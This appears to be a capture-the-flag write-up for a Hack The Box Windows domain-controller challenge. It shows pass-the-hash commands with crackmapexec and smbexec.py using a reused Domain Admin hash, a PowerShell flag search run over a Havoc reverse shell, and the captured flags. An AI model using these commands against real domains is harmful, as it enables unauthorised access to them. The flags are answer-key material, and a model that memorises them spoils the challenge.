### Challenge description
FullPwn challenges don't have a description. We just get an IP address and are supposed to get user and root flag.

Because [Contempt](https://github.com/LazyTitan33/CTF-Writeups/blob/main/HTB%20-%20Business%20CTF%202023/FullPwn/Contempt.md) had the unintended vulnerability with Zerologon, HTB created this challenge. I got both user AND root flags for this challenge via unintended means as well.

We are dealing with the same Domain Controller. Because of this, the first thing I did was to check all the users and their hashes. Surprisingly, not all of them were changed and one of Domain Admins' hash still worked:

```bash
crackmapexec smb contempt.htb -u echo.rivers -H a7be11b5be8bb84196edbd0e8c0bc9ea --shares
```
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/835209c6-03e3-4d06-adf4-2846c5cb2d18)

We get access again via smbexec and NETLOGON share:

```bash
smbexec.py contemp.htb/echo.rivers@contempt.htb -hashes :a7be11b5be8bb84196edbd0e8c0bc9ea -share NETLOGON
```
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/f727876c-4825-4a00-9e0f-a877fe995514)

And get the administrator flag right away:

HTB{HeY_iv3_g0n3_phIsHINg_leav3_4_meSs4g3}

### Privilege de-escalation... again

I repeated the step from Contempt and got a reverse shell in Havoc and ran the recursive search for pattern:

```powershell
shell powershell -command "ls -fo -r \ -erroraction silentlycontinue | sls -pattern 'HTB{' -erroraction silentlycontinue"
```
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/69af9436-0123-4618-9471-06a014d06bd1)

And we get the user flag as well as the older flag from Contempt:
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/8ca6926e-bdcc-4c90-a0dd-4c90a35eb710)

HTB{1_nEveR_cL41m3D_t0_Be_4n_ss0_exPERt}
